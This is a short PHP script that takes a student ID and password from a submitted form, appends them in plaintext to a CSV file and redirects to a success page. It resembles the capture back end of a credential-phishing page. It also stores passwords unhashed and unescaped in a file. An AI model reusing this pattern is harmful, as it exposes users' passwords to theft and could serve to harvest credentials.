<?php
$logFile = "submissions.csv";

$studentId = $_POST['Student_ID'] ?? '';
$password  = $_POST['password'] ?? '';

$line = $password . "," . $studentId . ",SUBMITTED\n";
file_put_contents($logFile, $line, FILE_APPEND);

header("Location: success.html");
exit;
